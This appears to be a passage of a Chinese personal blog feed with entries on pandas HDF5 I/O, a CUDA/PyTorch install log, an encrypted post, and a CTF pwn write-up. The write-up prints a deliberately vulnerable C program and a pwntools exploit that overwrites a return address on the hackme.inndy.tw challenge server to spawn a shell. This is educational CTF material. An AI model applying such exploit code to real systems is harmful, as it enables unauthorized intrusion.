class="line">df_.to_hdf(path_or_buf=<span class="string">&#x27;demo.h5&#x27;</span>,key=<span class="string">&#x27;df_&#x27;</span>)</span><br><span class="line"><span class="comment">#创建于本地demo.h5进行IO连接的store对象</span></span><br><span class="line">store = pd.HDFStore(<span class="string">&#x27;demo.h5&#x27;</span>)</span><br><span class="line"><span class="comment">#查看指定h5对象中的所有键</span></span><br><span class="line"><span class="built_in">print</span>(store.keys())</span><br></pre></td></tr></table></figure><h3 id="read"><a href="#read" class="headerlink" title="read"></a>read</h3><p>在pandas中读入HDF5文件的方式主要有两种，一是通过上一节中类似的方式创建与本地h5文件连接的IO对象，接着使用键索引或者store对象的get()方法传入要提取数据的key来读入指定数据：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">store = pd.HDFStore(<span class="string">&#x27;demo.h5&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;方式1&#x27;&#x27;&#x27;</span></span><br><span class="line">df1 = store[<span class="string">&#x27;df&#x27;</span>]</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;方式2&#x27;&#x27;&#x27;</span></span><br><span class="line">df2 = store.get(<span class="string">&#x27;df&#x27;</span>)</span><br><span class="line">df1 == df2</span><br></pre></td></tr></table></figure><p>这两种方式都能顺利读取键对应的数据。</p><p>第二种读入h5格式文件中数据的方法是<code>pandas</code>中的<code>read_hdf()</code>，其主要参数如下：</p><p>　　<code>path_or_buf</code>：传入指定h5文件的名称</p><p>　　<code>key</code>：要提取数据的键</p><p>需要注意的是利用<code>read_hdf()</code>读取h5文件时对应文件不可以同时存在其他未关闭的IO对象，否则会报错</p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;起因&quot;&gt;&lt;a href=&quot;#起因&quot; class=&quot;headerlink&quot; title=&quot;起因&quot;&gt;&lt;/a&gt;起因&lt;/h2&gt;&lt;p&gt;学长发给我的h5文件不会处理 直接寄&lt;/p&gt;</summary>
    
    
    
    <category term="ML" scheme="http://example.com/categories/ML/"/>
    
    
    <category term="ML" scheme="http://example.com/tags/ML/"/>
    
  </entry>
  
  <entry>
    <title>CUDA+CUDNN+PYTORCH-GPU环境安装</title>
    <link href="http://example.com/2022/05/17/CUDA-torch-gpu-install/"/>
    <id>http://example.com/2022/05/17/CUDA-torch-gpu-install/</id>
    <published>2022-05-17T11:47:31.000Z</published>
    <updated>2022-05-19T04:29:43.398Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CUDA-CUDNN-PYTORCH-GPU"><a href="#CUDA-CUDNN-PYTORCH-GPU" class="headerlink" title="CUDA+CUDNN+PYTORCH-GPU"></a>CUDA+CUDNN+PYTORCH-GPU</h1><p>一部血泪史  安了一天  踩了好多坑 。。。 清华源是什么垃圾  最后还是pip靠谱</p><span id="more"></span><h2 id="step1"><a href="#step1" class="headerlink" title="step1"></a>step1</h2><p>首先安装 CUDA </p><p>安了我一天 先看一下版本  一定要下符合自己的版本的！！！</p><p>然后要先去 GeForce Experience 更新驱动 。。。</p><h2 id="step2"><a href="#step2" class="headerlink" title="step2"></a>step2</h2><p>就按网上说的 下来后  复制到cuda的文件夹里</p><h2 id="step3"><a href="#step3" class="headerlink" title="step3"></a>step3</h2><p>最复杂的 </p><p>由于我是用了conda</p><p>网上配置清华源在下最新版本的pytorch时是不中用的</p><p>我们还需要加几个源</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">conda config --add channels https:<span class="regexp">//mi</span>rrors.tuna.tsinghua.edu.cn<span class="regexp">/anaconda/</span>pkgs/free </span><br><span class="line">conda config --add channels https:<span class="regexp">//mi</span>rrors.tuna.tsinghua.edu.cn<span class="regexp">/anaconda/</span>pkgs/main</span><br><span class="line">conda config --add channels https:<span class="regexp">//mi</span>rrors.tuna.tsinghua.edu.cn<span class="regexp">/anaconda/</span>pkgs/pro</span><br><span class="line">conda config --add channels https:<span class="regexp">//mi</span>rrors.tuna.tsinghua.edu.cn<span class="regexp">/anaconda/</span>pkgs/msys2</span><br></pre></td></tr></table></figure><p>下面这个一定要加 </p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">conda config --add channels https:<span class="regexp">//mi</span>rrors.tuna.tsinghua.edu.cn<span class="regexp">/anaconda/</span>cloud/pytorch</span><br></pre></td></tr></table></figure><p>然后可以参考一下<a href="https://zhuanlan.zhihu.com/p/110332563">关于anaconda安装torch-gpu的最新方法（超详细，2020最新版） - 知乎 (zhihu.com)</a></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">conda</span> install pytorch torchvision torchaudio cudatoolkit=<span class="number">11</span>.<span class="number">6</span></span><br></pre></td></tr></table></figure><p>然后还是不行  的我一脸懵逼</p><p><code>conda list</code> 一下</p><p><img src="/2022/05/17/CUDA-torch-gpu-install/image-20220518113627873.png" alt="image-20220518113627873"></p><p>发现还是GPU</p><p>fuck</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">conda</span> install https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud/pytorch/win-<span class="number">64</span>/pytorch-<span class="number">1</span>.<span class="number">11</span>.<span class="number">0</span>-py3.<span class="number">7</span>_cuda11.<span class="number">5</span>_cudnn8_0.tar.bz2</span><br></pre></td></tr></table></figure><p>直接去源网站里找 fuck</p><h2 id="bug"><a href="#bug" class="headerlink" title="bug"></a>bug</h2><p><a href="https://blog.csdn.net/qq_43550820/article/details/123708474">(62条消息) conda安装GPU版pytorch，却是cpu版本的原因_廿十七的博客-CSDN博客_conda安装pytorch是cpu版本</a></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">conda uninstall pytorch-mutex</span><br></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">conda</span> install https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud/pytorch/win-<span class="number">64</span>/pytorch-<span class="number">1</span>.<span class="number">9</span>.<span class="number">1</span>-py3.<span class="number">9</span>_cuda11.<span class="number">1</span>_cudnn8_0.tar.bz2</span><br></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">conda install https:<span class="regexp">//mi</span>rrors.tuna.tsinghua.edu.cn<span class="regexp">/anaconda/</span>cloud<span class="regexp">/pytorch/</span>win-<span class="number">64</span>/torchvision-<span class="number">0.12</span>.<span class="number">0</span>-py39_cu115.tar.bz2</span><br></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">pip</span> install torch==<span class="number">1</span>.<span class="number">9</span>.<span class="number">1</span>+cu111 torchvision==<span class="number">0</span>.<span class="number">10</span>.<span class="number">1</span>+cu111 torchaudio==<span class="number">0</span>.<span class="number">9</span>.<span class="number">1</span> -f https://download.pytorch.org/whl/torch_stable.html --target E:\conda\envs\torch1.<span class="number">9</span>\Lib\site-packages</span><br></pre></td></tr></table></figure><h2 id="离线下载"><a href="#离线下载" class="headerlink" title="离线下载"></a>离线下载</h2><p>先下好whl</p><p>然后进入当前目录</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip <span class="keyword">install</span> xxx.whl</span><br></pre></td></tr></table></figure><h2 id="利用pkgs里的缓存文件"><a href="#利用pkgs里的缓存文件" class="headerlink" title="利用pkgs里的缓存文件"></a>利用pkgs里的缓存文件</h2><p>进入pkgs然后 </p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">conda</span></span> install ...</span><br></pre></td></tr></table></figure><h2 id="step4"><a href="#step4" class="headerlink" title="step4"></a>step4</h2><p>先直接把whl pytorch下载下来</p><p>然后 利用离线下载搞他</p><p>最终成功</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;CUDA-CUDNN-PYTORCH-GPU&quot;&gt;&lt;a href=&quot;#CUDA-CUDNN-PYTORCH-GPU&quot; class=&quot;headerlink&quot; title=&quot;CUDA+CUDNN+PYTORCH-GPU&quot;&gt;&lt;/a&gt;CUDA+CUDNN+PYTORCH-GPU&lt;/h1&gt;&lt;p&gt;一部血泪史  安了一天  踩了好多坑 。。。 清华源是什么垃圾  最后还是pip靠谱&lt;/p&gt;</summary>
    
    
    
    <category term="EXP" scheme="http://example.com/categories/EXP/"/>
    
    
    <category term="ML" scheme="http://example.com/tags/ML/"/>
    
  </entry>
  
  <entry>
    <title>learn-month3</title>
    <link href="http://example.com/2022/05/16/learn-month3/"/>
    <id>http://example.com/2022/05/16/learn-month3/</id>
    <published>2022-05-16T07:44:27.000Z</published>
    <updated>2022-06-12T12:39:49.404Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="ddb8cdae4cb5c445807e99ab9be2fc3f0225f05ba1bd948c771cdd6308772a9c"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">Here&#39;s something encrypted, password is required to continue reading.</summary>
    
    
    
    <category term="learn" scheme="http://example.com/categories/learn/"/>
    
    
    <category term="learn365" scheme="http://example.com/tags/learn365/"/>
    
  </entry>
  
  <entry>
    <title>hackme-pwn</title>
    <link href="http://example.com/2022/05/15/hackme-pwn/"/>
    <id>http://example.com/2022/05/15/hackme-pwn/</id>
    <published>2022-05-15T12:11:49.000Z</published>
    <updated>2022-06-02T11:58:31.096Z</updated>
    
    <content type="html"><![CDATA[<p>hack me 的 pwn 系列 鬼知道 我什么时候有时间刷</p><span id="more"></span><h1 id="pwn-them-all！"><a href="#pwn-them-all！" class="headerlink" title="pwn them all！"></a>pwn them all！</h1><h2 id="homework"><a href="#homework" class="headerlink" title="homework"></a>homework</h2><p>源码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> name[<span class="number">1024</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">call_me_maybe</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">unbuffer_io</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">set_timeout</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    alarm(<span class="number">120</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">ask_name</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;What&#x27;s your name? &quot;</span>);</span><br><span class="line">    gets(name);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">say_goodbye</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Goodbye, %s\n&quot;</span>, name);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">run_program</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> arr[<span class="number">10</span>], i, v, act;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">        arr[i] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;0 &gt; exit&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;1 &gt; edit number&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;2 &gt; show number&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;3 &gt; sum&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;4 &gt; dump all numbers&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot; &gt; &quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;act);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">switch</span>(act) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Index to edit: &quot;</span>);</span><br><span class="line">                <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;i);</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;How many? &quot;</span>);</span><br><span class="line">                <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;v);</span><br><span class="line">                arr[i] = v;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Index to show: &quot;</span>);</span><br><span class="line">                <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;i);</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;arr[%d] is %d\n&quot;</span>, i, arr[i]);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">                v = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">                    v += arr[i];</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Sum is %d\n&quot;</span>, v);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">                <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;arr[%d] is %d\n&quot;</span>, i, arr[i]);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    set_timeout();</span><br><span class="line">    unbuffer_io();</span><br><span class="line">    ask_name();</span><br><span class="line">    run_program();</span><br><span class="line">    say_goodbye();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看看怎么利用</p><p><img src="/2022/05/15/hackme-pwn/image-20220602163909356.png" alt="image-20220602163909356"></p><p>数组溢出</p><p>很容易算出来  需要 0x34+4</p><p>56 = 4 * 14，可知是第14个值</p><p>然后我们直接打就行了</p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line">context(log_level=<span class="string">&quot;debug&quot;</span>, arch=<span class="string">&quot;i386&quot;</span>, os=<span class="string">&quot;linux&quot;</span>)</span><br><span class="line">ret_addr = <span class="number">0x80485fb</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;hackme.inndy.tw&#x27;</span>, <span class="number">7701</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;name?&#x27;</span>,<span class="string">&#x27;b1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27; &gt; &#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Index to edit: &#x27;</span>,<span class="string">&#x27;14&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;How many? &#x27;</span>,<span class="built_in">str</span>(ret_addr))</span><br><span class="line"><span class="comment">#Index to edit:</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>最后要再打个<code>0</code> 来<code>exit</code></p><p>一些<code>pwntools</code>中的常用命令</p><ul><li><code>send(payload)</code> 发送payload</li><li><code>sendline(payload)</code> 发送payload，并进行换行（末尾<strong>\n</strong>）</li><li><code>sendafter(some_string, payload)</code> 接收到 some_string 后, 发送你的 payload</li><li><code>recvn(N)</code> 接受 N(数字) 字符</li><li><code>recvline()</code> 接收一行输出</li><li><code>recvlines(N)</code> 接收 N(数字) 行输出</li><li><code>recvuntil(some_string)</code> 接收到 some_string 为止</li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;hack me 的 pwn 系列 鬼知道 我什么时候有时间刷&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="http://example.com/categories/CTF/"/>
    
    
    <category term="pwn" scheme="http://example.com/tags/pwn/"/>
    
  </entry>
  
</feed>
